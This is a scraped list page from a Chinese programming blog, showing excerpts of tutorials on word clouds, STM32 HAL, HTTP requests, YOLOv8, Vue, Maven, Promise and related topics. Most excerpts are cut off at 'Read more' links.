词云技术最初是为了数据挖掘和文本分析而开发的，但现在它已经成为了一种常见的数据可视化方式，常用于展示文章、调查问卷、舆情分析等文本数据，可以让用户快速了解文本的热点和关键词。
词云的生成一般包括以下步骤：
收集文本数据并进行处理，去除一些无用信息，例如停用词等；
对于每个单词计算其出现频率，可以使用Python的nltk和jieba等自然语言处理工具来实现；
根据单词的频率和一些其他的配置参数，使用词云库（例如wordcloud）来生成词云图像；
可以使用matplotlib库来展示词云，也可以将其保存为文件。
值得注意的是，词云并不是一种严格意义上的数据分析方法，它只能展示数据的一部分。在某些情况下，词云可能会产生误导性的信息，需要结合其他的数据分析方法来进行分析和判断。
def getText(filepath): f=open(filepath,"r",encoding='utf-8') text=f.read() f.close() return text import jieba def wordFreq(filepath,text,topn): f=open(filepath,"r",encoding='utf-8') text=f.read() words=jieba.lcut(text.strip()) counts={} for word in words: if len(word)==1: continue else: counts[word]=counts.get(word,0)+1 items=list(counts.items()) items.sort(key=lambda x:x[1],reverse=True) f=open(filepath[:-4]+'_词频.txt',"w") for i in range(topn): word,count=items[i] f.write("{}\t{}\n".format(word,count)) f.close() getText(r"E:\大创\江苏省数字化公共服务能力提升路径研究\n2.txt") f=open(r"E:\大创\江苏省数字化公共服务能力提升路径研究\n2.txt","r",encoding='utf-8') text=f.read() wordFreq(r"E:\大创\江苏省数字化公共服务能力提升路径研究\n2.txt",text,70) # In[14]: import matplotlib.pyplot as plt import wordcloud from imageio import imread bg_pic=imread(r'E:\大创\江苏省数字化公共服务能力提升路径研究\n.jpg') f=open(r"E:\大创\江苏省数字化公共服务能力提升路径研究\n2_词频.txt") text=f.read() f.close() wcloud=wordcloud.WordCloud(font_path=r'C:\Windows\Fonts\simhei.ttf',background_color="white",width=1000, max_words=500, mask=bg_pic, height=860,margin=2).generate(text) wcloud.to_file("n2cloud.jpg") plt.imshow(wcloud) plt.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c81cd40f7122848d5c31b6eb4d08620f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f56531317f2f428e52aa91ecfb256f48/" rel="bookmark">
			常用STM32F4HAL库函数及其示例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		STM32F4HAL库函数是针对STM32F4系列微控制器的硬件抽象层，它封装了一些底层硬件操作，使程序员可以更方便地编写应用代码。以下是常用的一些STM32F4HAL库函数及其详细解释和示例。
GPIO库函数 HAL_GPIO_Init()：初始化GPIO口。
示例：初始化PF10引脚为推挽输出模式，输出高电平。GPIO_InitTypeDef GPIO_InitStruct = {0}; GPIO_InitStruct.Pin = GPIO_PIN_10; GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP; GPIO_InitStruct.Pull = GPIO_NOPULL; GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_MEDIUM; HAL_GPIO_Init(GPIOF, &amp;GPIO_InitStruct); HAL_GPIO_WritePin(GPIOF, GPIO_PIN_10, GPIO_PIN_SET); HAL_GPIO_ReadPin()：读取GPIO口的状态。
示例：读取PA0引脚的状态。GPIO_PinState state = HAL_GPIO_ReadPin(GPIOA, GPIO_PIN_0); if (state == GPIO_PIN_SET) { // PA0引脚为高电平 } USART库函数 HAL_UART_Init()：初始化USART串口。
示例：初始化USART2串口，波特率为9600。UART_HandleTypeDef huart2 = {0}; huart2.Instance = USART2; huart2.Init.BaudRate = 9600; huart2.Init.WordLength = UART_WORDLENGTH_8B; huart2.Init.StopBits = UART_STOPBITS_1; huart2.Init.Parity = UART_PARITY_NONE; huart2.Init.Mode = UART_MODE_TX_RX; huart2.Init.HwFlowCtl = UART_HWCONTROL_NONE; huart2.Init.OverSampling = UART_OVERSAMPLING_16; HAL_UART_Init(&amp;huart2); HAL_UART_Transmit()：发送数据到USART串口。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f56531317f2f428e52aa91ecfb256f48/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9aa9f3eb840e2278563d9b10a2642144/" rel="bookmark">
			HTTP协议
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		HTTP协议 OVERVIEW HTTP协议一、web服务器处理请求1.静态请求2.动态请求 二、http协议请求与响应1.请求消息(Request)（1）Get方式提交数据（2）Post方式提交数据 2.响应消息(Response)3.http状态码 一、web服务器处理请求 1.静态请求 客户端访问服务器的静态网页, 不涉及任何数据的处理, 如下面的URL:
http://localhsot/login.html 2.动态请求 客户端会将数据提交给服务器
# 使用get方式提交数据得到的url http://localhost/login?user=zhang3&amp;passwd=123456&amp;age=12&amp;sex=man - http: 协议 - localhost: 域名 - /login: 服务器端要处理的指令 - ? : 连接符, 后边的内容是客户端给服务器提交的数据 - &amp; : 分隔符 动态的url如何找服务器端处理的指令? - 去掉协议 - 去掉域名/IP - 去掉端口 - 去掉?和它后边的内容 # 如果看到的是请求行, 如何找处理指令? POST /upload/UploadAction HTTP/1.1 GET /?username=tom&amp;phone=123&amp;email=hello%40qq.com&amp;date=2018-01-01&amp;sex=male&amp;class=3&amp;rule=on HTTP/1.1 1. 找请求行的第二部分 - 如果是post, 处理指令就是请求行的第二部分 - 如果是get, 处理指令就是请求行的第二部分, ? 以前的内容 二、http协议请求与响应 1.请求消息(Request) 客户端(浏览器)发送给服务器的数据格式，请求分为四部分: 请求行, 请求头, 空行, 请求数据
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9aa9f3eb840e2278563d9b10a2642144/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7cca59d5f4b7823abe281e9bfffd0f93/" rel="bookmark">
			springboot启动彩蛋 整合坤坤 banner.txt
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 banner 算是spring的一个彩蛋
可以自定义springboot启动时候的ascii字符画
那么作为一个ikun 怎么能视而不管呢
首先我们在resources目录下新建一个txt文档，名叫 banner.txt
然后在这个文件中就可以自由发挥了
最后启动项目：
是不是很有意思呢？
字符奉上：
鸡你太美 鸡你实在太美 鸡你是太美 鸡你太美 实在是太美鸡你 鸡你 实在是太美鸡你 美 鸡你 实在是太美鸡美 太美 鸡你 实在是太美鸡美 太美 鸡你 实在是太美鸡美 太美 鸡你 鸡你实在是美太美 美蓝球球 鸡 鸡 鸡你实在是太美 篮球篮球球 鸡 鸡你太美裆鸡太啊 蓝篮球 鸡你太美裆裆鸡美 鸡你美裆 裆鸡美 鸡太美 鸡太美 鸡美 鸡美 鸡美 鸡美 鸡美 鸡美 鸡太 鸡太 金 猴 金猴 皮 鞋 皮鞋金猴 金光 金光 大道 大道 坤坤保佑 永不宕机 永无BUG 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9f90aae1bf7316c18a075fb208c58982/" rel="bookmark">
			如何修改YOLOV8?(从这8方面入手帮你提升精度)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当今计算机视觉技术中，YOLOv8 是一个非常流行的物体检测算法。然而，它仍然存在一些局限性，其中最重要的是其准确性。在本文中，我们将探讨一些可以改进 YOLOv8 精度的方法。如果您是计算机视觉领域的从业者或爱好者，那么这篇文章一定会引起您的兴趣。以下是改进 YOLOv8 精度的八种方法。
1. 数据增强：增加更多的数据可以提高 YOLOv8 的准确性。这可以通过使用各种数据增强技术来实现，例如旋转、平移、翻转、缩放等。这些技术可以增加训练集的样本数量，从而提高算法的泛化能力。
2. 超参数优化：超参数是 YOLOv8 中的一些调整参数，例如学习率、正则化参数等。通过对这些超参数进行优化，可以提高算法的准确性。我们可以使用自动化工具如网格搜索、贝叶斯优化等来寻找最佳超参数组合。
3. 模型集成：通过使用多个模型进行集成，可以提高 YOLOv8 的准确性。我们可以使用不同的预训练模型进行融合，例如 EfficientNet、ResNet 等。这种方法可以提高模型的鲁棒性和泛化能力。
4. 修改损失函数：YOLOv8 的损失函数是非常关键的。通过修改损失函数，可以提高算法的准确性。例如，可以尝试使用更适合任务的损失函数，如 Focal Loss、IoU Loss 等。
5. 分类器融合：对于一些特定的场景，例如在人脸检测中，我们可以使用分类器融合的方法来提高 YOLOv8 的准确性。这种方法可以结合多个分类器的结果，从而得到更准确的检测结果。
6. 多尺度训练：通过使用不同的图像尺寸进行训练，可以提高 YOLOv8 的准确性。这种方法可以在训练过程中使用多个尺度的图像，从而使模型能够更好地适应各种大小的物体。
7. 网络架构优化：YOLOv8 网络架构的优化也可以提高算法的准确性。例如，可以添加更多的卷积层或改变卷积层的大小等。这种方法可以改进模型的特征提取能力，从而提高模型的准确性。
8. 后处理技术：在 YOLOv8 的检测结果中，可能存在一些误检或漏检的情况。为了进一步提高准确性，我们可以使用一些后处理技术，例如非极大值抑制（NMS）和边界框回归等。这些技术可以过滤掉一些冗余的检测结果，并对检测框进行微调，从而提高算法的准确性。
综上所述，我们可以看到，有许多方法可以改进 YOLOv8 的精度。这些方法可以单独使用，也可以组合使用，从而得到更好的结果。但是需要注意的是，这些方法并非一定适用于所有场景，具体使用时需要根据具体情况进行调整。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/49b7d64881a99fcb13d3276e86afa24e/" rel="bookmark">
			【vue框架】 vue-cli从0开始搭建移动端vue项目框架（vscode版本）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一. 使用 vue-cli 搭建项目 安装vue/cli 1.安装vue/cli ，执行下面的命令安装或是升级
npm i -g @vue/cli 安装vue/cli 报错解决方案 ​ 如果安装报错如下
npm WARN rollback Rolling back node-notifier@10.0.1 failed (this is probably harmless): EPERM: operation not permitted, rmdir 'D:\Devlop\nodejs\node_global\node_modules\@vue\cli' npm ERR! code EEXIST npm ERR! path D:\Devlop\nodejs\node_global\node_modules\@vue\cli\bin\vue.js npm ERR! dest D:\Devlop\nodejs\node_global\vue.cmd npm ERR! EEXIST: file already exists, cmd shim 'D:\Devlop\nodejs\node_global\node_modules\@vue\cli\bin\vue.js' -&gt; 'D:\Devlop\nodejs\node_global\vue.cmd' npm ERR! File exists: D:\Devlop\nodejs\node_global\vue.cmd npm ERR! Remove the existing file and try again, or run npm npm ERR!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/49b7d64881a99fcb13d3276e86afa24e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a84fd6989dde919f6d0dfdb6ed3ec9bd/" rel="bookmark">
			Maven 多模块 快速入门 简单示例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Maven 多模块简单示例 项目结构 (这里gateway属于单独的模块，不是muapi的子模块)
解释 ：
&lt;dependencyManagement&gt;标签：
Maven中的dependencyManagement元素提供了一种管理依赖版本号的方式。在dependencyManagement元素中声明所依赖的jar包的版本号等信息，那么所有子项目再次引入此依赖jar包时则无需显式的列出版本号。Maven会沿着父子层级向上寻找拥有dependencyManagement 元素的项目，然后使用它指定的版本号。
子模块中 parent标签里的 均设置为父模块的
父模块pom.xml
&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.7.0&lt;/version&gt; &lt;/parent&gt; &lt;groupId&gt;com.mu&lt;/groupId&gt; &lt;artifactId&gt;muapi&lt;/artifactId&gt; &lt;packaging&gt;pom&lt;/packaging&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;modules&gt; &lt;module&gt;muapi-interface&lt;/module&gt; &lt;module&gt;muapi-backend&lt;/module&gt; &lt;/modules&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;mabatis.version&gt;2.2.2&lt;/mabatis.version&gt; &lt;mybatis-plus.version&gt;3.5.1&lt;/mybatis-plus.version&gt; &lt;mysql.version&gt;8.0.30&lt;/mysql.version&gt; &lt;knife4j.version&gt;3.0.3&lt;/knife4j.version&gt; &lt;jwt.version&gt;0.9.1&lt;/jwt.version&gt; &lt;fastjson.version&gt;2.0.21&lt;/fastjson.version&gt; &lt;muapi-client-sdk&gt;0.0.1&lt;/muapi-client-sdk&gt; &lt;dubbo.version&gt;3.0.7&lt;/dubbo.version&gt; &lt;nacos.version&gt;2.1.0&lt;/nacos.version&gt; &lt;wx-java-mp&gt;4.4.0&lt;/wx-java-mp&gt; &lt;gson.version&gt;2.9.0&lt;/gson.version&gt; &lt;commons-lang3.version&gt;3.12.0&lt;/commons-lang3.version&gt; &lt;junit.version&gt;4.13.2&lt;/junit.version&gt; &lt;cos_api&gt;5.6.89&lt;/cos_api&gt; &lt;easyexcel.version&gt;3.1.1&lt;/easyexcel.version&gt; &lt;hutool.version&gt;5.8.8&lt;/hutool.version&gt; &lt;/properties&gt; &lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.mu&lt;/groupId&gt; &lt;artifactId&gt;muapi-client-sdk&lt;/artifactId&gt; &lt;version&gt;${muapi-client-sdk}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${mabatis.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a84fd6989dde919f6d0dfdb6ed3ec9bd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d0b8e10146020dcf0194d9499ff8f71e/" rel="bookmark">
			调用百度地图API时，在for循环中使用new BMap.InfoWindow()，只显示最后一个的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在使用new BMap.InfoWindow()时，添加多个标记，可能在循环中添加addEventListener监听事件，但是最后发现只有最后一个监听管用，解决方法如下：
map() { let t = this; // 百度地图API功能 var map = new BMapGL.Map("map"); var point = new BMapGL.Point(112.541526, 37.934578); map.centerAndZoom(point, 10); var myIcon = new BMapGL.Icon( require("../assets/images/location.png"), new BMapGL.Size(48, 48) ); var markerList = []; //标记集合 for (var i in t.sourceList) { markerList.push( new BMapGL.Marker( new BMapGL.Point(t.sourceList[i].lng, t.sourceList[i].lat), { icon: myIcon, } ) ); map.addOverlay(markerList[i]); addInfoWinview(i); } function addInfoWinview(i) { markerList[i].addEventListener("click", function () { map.openInfoWindow( new BMapGL.InfoWindow( `公司：${t.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d0b8e10146020dcf0194d9499ff8f71e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5f105b1c2d56dbf508a71d4e48514079/" rel="bookmark">
			yolov7之Wise-iou
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		学习视频： YOLOV7改进-Wise IoU_哔哩哔哩_bilibili
代码地址： objectdetection_script/yolov7-iou.py at master · z1069614715/objectdetection_script (github.com)
需要的就是这部分，我复制下来了
class WIoU_Scale: ''' monotonous: { None: origin v1 True: monotonic FM v2 False: non-monotonic FM v3 } momentum: The momentum of running mean''' iou_mean = 1. monotonous = False _momentum = 1 - 0.5 ** (1 / 7000) _is_train = True def __init__(self, iou): self.iou = iou self._update(self) @classmethod def _update(cls, self): if cls._is_train: cls.iou_mean = (1 - cls.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5f105b1c2d56dbf508a71d4e48514079/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c605eeb64be14b09557912bcfc44308c/" rel="bookmark">
			python包安装方法及常见问题处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基本语法pip install 包名
问题1：外网安装包，因为网速慢报错。建议使用镜像源。
pip install 包名 -i 镜像源
常见报错：ERROR: No matching distribution found for
可能原因：
1、镜像源没有资源 换镜像源。
2、镜像源网址协议不对，采用的http。 需要按照提示加--trusted-host pypi.douban.com
常见镜像源：
清华：https://pypi.tuna.tsinghua.edu.cn/simple
阿里云：https://mirrors.aliyun.com/pypi/simple/
中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple/
豆瓣：https://pypi.douban.com/simple/
问题2：单个安装太缓慢。建议使用requirements.txt文件批量安装。
pip install -r requirements.txt
requirements.txt文件在项目中的生成方法 pip freeze requirements.txt
问题3：部分安装包很难找到，例如talib。可以利用wheel文件安装。
常用包wheel文件下载地址 https://www.lfd.uci.edu/~gohlke/pythonlibs/
在cmd中
步骤1 cd 文件下载路径
步骤2 pip install wheel文件名
常见报错 .whl is not a supported wheel on this platform.
原因：安装的wheel文件版本不对。
查询电脑支持的wheel文件版本命令 pip debug --verbose
额外：通过github在线安装，离线安装python包。
在线安装：
pip install git+github中的地址 （注意这种方法因为需要下载外网资源很容易失败）
离线安装
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c605eeb64be14b09557912bcfc44308c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7626bbaecb1f8560ec0ec7ad36d8d87e/" rel="bookmark">
			postman无法发送请求，报错postman 无法发送请求之Error: connect ECONNREFUSED 127.0.0.1:80
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		解决办法：
1.点击settings
2.点击proxy
3. 把use the system proxy 取消勾选
4.按下图增加一个代理
5.确保控制面板的 下面两个功能勾选上
先找到启用或关闭windows功能
再勾选下面两个选项再点击确定，等待下载完成
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fee11fa263eed25aec9b4178bf5c10dd/" rel="bookmark">
			python scipy.optimize 非线性规划 求解局部最优和全局最优
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 非线性规划 求解局部最优 首先展示一个最简单的示例：
from scipy.optimize import minimize def fun_convex(x): return (x - 1) ** 2 + 3 minimize(fun=fun_convex, x0=0, bounds=[(-10,10)]) scipy.optimize.minimize(fun, x0, args=(), method=None, jac=None, hess=None, hessp=None, bounds=None, constraints=(), tol=None, callback=None, options=None) fun: 求最小值的目标函数 x0: 变量的初始猜测值，如果有多个变量，需要给每个变量一个初始猜测值 args: 常数值，fun中的可变常量 method: 求极值的方法，官方文档给了很多种。一般使用默认 constraints: 约束条件，针对fun中为参数的部分进行约束限制 scipy.optimize.minimizel 官方说明文档
通过scipy.optimize.minimize，我们可以很轻松的求解凸函数的局部最优的数值解，这里有几个注意点：
①求解函数为非凸函数时，所求结果为局部最优
②求解函数为凸函数时，所求结果为最小值
③所求皆为数值解而不是理论解
下面展示一个非凸函数的示例：
from scipy.optimize import minimize def fun_nonconvex(x): if x&lt;0: return ( x + 2 ) ** 2 + 1 else: return ( x - 2 ) ** 2 + 2 minimize(fun=fun_nonconvex, x0=0, bounds=[(-10,10)]) 我们可以发现，所求的x=2并非为全局最优解（应该是x=-2）而是局部最优解，所求结果与设置的初值x0有很大关系。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fee11fa263eed25aec9b4178bf5c10dd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7d086ec790bceda62db560c27967b345/" rel="bookmark">
			深入理解Promise之一步步教你手写Promise构造函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 前言一，手写教学1.1 基本结构1.2 resolve与reject结构搭建1.3 resolve与reject代码实现1.4 throw抛出异常改变状态1.5 promise对象状态只能转换一次1.6 then方法进行回调1.7 异步任务的回调执行1.8 执行多个回调的实现1.9 同步修改状态then方法结果返回1.10 异步修改状态then方法结果返回 二，总体代码后记 前言 Promise是前端面试中很重要的一个考点。如何真正的了解promise？我们不如自己动手，写一个可以拿来用的Promise.js。
下面是循序递进的写法教学，本文的最后也有完整写法的代码可以借鉴，希望能够帮助大家！
后面如果有机会会写一篇详解promise的博客，欢迎关注！
一，手写教学 1.1 基本结构 想要写一个最初的结构，我们不妨先用一下Promise，然后再进行分析。
let p = new Promise((resolve, reject) =&gt; { resolve('巧克力小猫猿') }) p.then(value =&gt; { console.log(value) }, reason =&gt; { console.log(reason) }) 如上代码，我们了解到了，Promise构造函数里面传进去的是一个函数，所以我们也为其加一个函数类型的形参：
function Promise(executor) { } 上述代码也用到了then方法，但目前我们的结构中还没有then，所以也写一个then，且有两个参数：
Promise.prototype.then = function(onResolved, onRejected) { } 以上，基本结构已经写完。
1.2 resolve与reject结构搭建 我们都知道，在使用Promise的时候，内部会传一个执行器（函数），且该函数有两个函数类型的参数：resolve和reject。
因此，我们在写结构的时候也要声明着两个函数，并在内部执行器调用的时候使用它们，代码如下：
function Promise(executor) { //同步调用 function resolve(data) { } function reject(data) { } executor(resolve, reject) } //先添加一个then Promise.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7d086ec790bceda62db560c27967b345/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9801e7c10be0fd0d14d36d0d432858ec/" rel="bookmark">
			小公司-小前端团队，如何一步步走向成熟？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		现状 去年下半年，加入了一家小公司，前端团队也是刚刚成立没多久，虽然自己心里上已经提前预设了团队可能存在的种种问题，但是，进入以后，还是发现了一系列比较明显的问题，这里列举其中一些典型问题：
前后端代码没有分离，发布上线等没有分离前端技术栈单一，所有项目都是直接采用vue3-vben-admin代码规范，commit规范等等没有统一，CI/CD流程不规范。没有设计，产品等，导致整体开发流程不规范。...其他 之所以，列举以上这些问题，并不是对我司有任何的不满啊，哈哈哈，更多的是希望能够给遇到类似问题的小伙伴儿一些方案或者方向，同时，也能够帮助大家的前端团队逐渐走向规范与成熟。
成熟的前端团队是什么样子？ 前端团队刚刚成立不久，如何一步步走向规范与成熟呢？很显然，我们需要知道一个成熟的前端团队是什么样子的（当然一般谈论这种话题，很有可能被喷），其实呢？没有一个明确的标准，而且公司业务不同，前端的技术栈，基建等都会不同，这里只是列举出了建设前端团队比较常见的一些方向供大家参考：
前端规范 这里，总结出了一些常见的规范，直接上图：
如果大家所在团队中，对这些规范没有进行统一，可以参考上面这些方向在团队中进行推广。
前端项目模版 大家肯定都知道vue，react的官方脚手架工具：vue-cli, create-react-app,通过这些基础脚手架，就可以帮助我们创建最基础的前端项目代码，但是随着业务的迭代，各个公司的业务场景不同，技术栈不同，往往需要在vue-cli, create-react-app创建的项目模版基础上，逐渐沉淀出符合公司的自定义项目模版代码，具体可以参考下图：
前端脚手架 上面，我们讲了前端项目模版，那如何更好的去管理模版呢？答案就是脚手架，加入没有脚手架，我们很可能是直接将模版代码放在一个单独的仓库中，每次开启一个新项目，就clone到本地，然后在copy一份出来，这样虽然也可以做，但是脚手架可以通过命令更好更快捷的帮助我们去管理项目模版，以及进行项目初始化等等操作。
当然，脚手架的技术栈和传统的前端项目的技术栈有所不同，上面图中也有说到，底层依赖Node，Lerna,Yargs等，感兴趣的可以学习一些，是否要维护公司自己的脚手架，就要评估人力成本，收益等，结合团队的实际情况进行考量了。
前端自动化构建部署（CI/CD） 这部分就是大家常说的CI/CD，即前端项目如何持续集成与部署，这里就不额外展开说啦，具体可以参考我自己写的一篇文章：基于Docker + Nginx + Gitlab-runner 构建前端CI/CD
有一点说明一下：可能早期，工作经验不多的前端小伙伴儿，会遇到这种情况，每次项目发布上线，可能都是直接使用公司现成的发布系统，直接在页面点点就可以成功，但是往往遇到问题的时候，就不太知道怎么去排查问题，还得请教运维等相关同学，遇到好交流的同事可能还帮你解决一下，遇到一些不友好的同事，你自己内心也会一万个....
因此，随着前端的不断发展，对于前端的要求也会越来越高，我们也有必要知道前端项目底层到底是如何进行CI/CD，如何去发布上线，这里就会涉及到Docker,K8s,Nginx,CI工具等技术栈，感兴趣的同学也可以去写一些demo，了解了解。
前端全链路监控体系 其实就是随着项目的迭代，功能越来越复杂，尤其是一些C端的项目，我们需要去掌握用户的行为，从而，根据用户的行为，去进一步更好的迭代我们的项目， 那么，这就需要我们对这些行为进行监控，也就是大家常说的埋点，
一个完整的监控体系，通常包含如下内容：
如果有的小伙伴儿所在团队有这样的需求，那么就要考虑如何去做啦，目前市场上也有一些开源的方案可以参考，例如：Sentry，当然，也要结合团队实际情况，看是否需要自己去实现一套完整的监控体系，因为实现成本也不低，尤其小公司，我们就需要调研调研，是否可以使用一些开源的方案去实现啦。
前端物料库 什么是前端物料？其实就是大家常说的组件库，工具库等可以复用的代码，具体可以参考下图：
一般大厂都会有类似的物料平台，那么，我们小公司呢？就要考虑其实现成本和收益啦，也不一定非要建立物料平台，因为小公司能够沉淀的物料也不会有那么多，比如：一般有沉淀一些组件库，工具库，我们也可以发布到npm上，这样团队内部也可以使用。
怎么做？ 那具体怎么做呢？主要从以下几方面考虑：
明确要解决的问题：结合公司团队当前情况，按照优先级明确现有问题明确要解决的问题的具体实现方案：通过调研，团队讨论等方式明确各个方案利弊，选择最优方案明确具体的执行步骤：从团队实际情况出发，最好是渐进式开启，在对现有业务不影响的前提下做增量式基建工作 于是，我进一步结合我司的情况，明确了以下几点是要优先去实现的：
确定前端技术栈明确前端规范前后端代码分离，打造独立的前端CI/CD 确定前端技术栈 由于我司目前主要中后台项目居多，这里确认的技术栈也主要基于此方向展开的。
首先，传统的中后台项目，前端一般会包含以下这些内容：
那以上这些内容，如何实现呢？可以从三个方向展开：
自己团队手动封装，形成团队自己的一套最佳实践（其实就是结合公司业务场景，逐渐沉淀出一套初始化项目的项目模版）
借助社区开源方案：这里推荐：蚂蚁开源的UmiJS
简单来说，该框架就是以插件的形式集成了传统中后台解决方案常见的内容，例如常见的路由管理，权限管理等等，我们只需要引入相应的插件即可。
使用现成的开箱即用的中台前端解决方案框架，这里推荐以下几个框架：
react的Ant Design Pro，Vue3的Vue3 Vben Admin，Vue2的vue-element-admin 那我司是如何选择的呢？历史项目使用了一部分Vue3 Vben Admin，新项目统一采用Ant Design Pro，
这里重点对比一下Vue-vben-admin和Ant design pro：
Vue3 Vben Admin
优势
当前使用技术栈，且用了两到三年，积累了一定的经验，趟过了一些坑。整体功能相对比较齐全，不需要从零开发。 劣势
本地版本迭代更新机制不太友好，需要开发者每次手动clone最新版本的模版仓库，然后还需要将原来的业务代码进行copy，而且如果对源码代码有更新的话，会更加麻烦，例如：一个组件，我们可能在项目中进行了二次修改，然后，我们更新vben版本的时候，作者很有可能也对该组件进行了代码更新，这个时候，就需要比对新旧组件代码，容易出现问题。 底层原因一：项目架构整体相对比较简单，没有采用monorepo架构，模版项目代码中封装的hook，组件等内容没有单独发npm包，没有版本管理。底层原因二：封装的组件，自定义render能力有限，需要我们手动修改组件源码。 部分源码嵌套层级较深，新手上手成本较大，随着业务的迭代，源码和业务代码容易混淆，导致后期版本升级较难。
目前我们项目首屏渲染过慢（后期可能会成为一个比较明显的问题）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9801e7c10be0fd0d14d36d0d432858ec/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/222ffd379c5072a08a8e94a3e7d96daf/" rel="bookmark">
			element ui tree组件怎么设置滚动条
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 &lt;el-tree class="el-scrollbar tree" :data="areaList" node-key="id" default-expand-all :expand-on-click-node="false" @current-change="currentChange"&gt; &lt;span class="custom-tree-node" slot-scope="{ node, data }"&gt; &lt;span&gt;{{ node.label }}&lt;/span&gt; &lt;span class="butotn"&gt; &lt;slot name="operate" :treeData="data"&gt;&lt;/slot&gt; &lt;/span&gt; &lt;/span&gt; &lt;/el-tree&gt; //css样式 .tree { display: inline-block; } 给tree元素添加el-scrollbar 和自定义class类名，并给el-tree的父元素设置overflow:auto
//全局样式 .Tree[data-v-610b47e2]::-webkit-scrollbar { width: 5px; height: 5px; } //内嵌滚动条样式 .Tree[data-v-610b47e2]::-webkit-scrollbar-thumb { border-radius: 1px; background-color: #40a0ff65; } //外部样式 .Tree[data-v-610b47e2]::-webkit-scrollbar-track { background-color: #f3f3f3; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eb8d9acf063ffca1e53f41bf21c24b77/" rel="bookmark">
			shell读取终端输入
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		用read 关键字 read -p “Enter input:” var
-p 的作用是输出后面的字符串作为提示。
echo $var
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
